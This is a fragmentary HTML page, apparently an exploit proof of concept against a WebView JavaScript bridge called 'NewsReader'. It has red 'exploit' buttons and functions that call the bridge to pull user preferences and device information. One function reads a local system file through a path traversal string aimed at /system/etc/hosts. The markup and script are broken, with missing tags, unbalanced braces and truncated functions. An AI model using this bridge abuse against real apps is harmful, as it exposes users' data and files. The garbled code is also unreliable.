<!DOCTYPE html>
<html>

        .exploit-btn { background: #ff4444; color: white; padding: 10px; margin: 5px; border: none; border-radius: 3px; }

</head>
<body>
    <div class="article">

                var userInfo = NewsReader.getUserPreferences();

            } catch(e) {
                document.getElementById('results').innerHTML += '<p>Error: ' + e + '</p>';
            }

        function getDeviceInfo() {

                var deviceInfo = NewsReader.getDeviceInfo();

        function readSystemFile() {

                var fileContent = NewsReader.readLocalFile("../../../../../system/etc/hosts");

            } catch(e) {
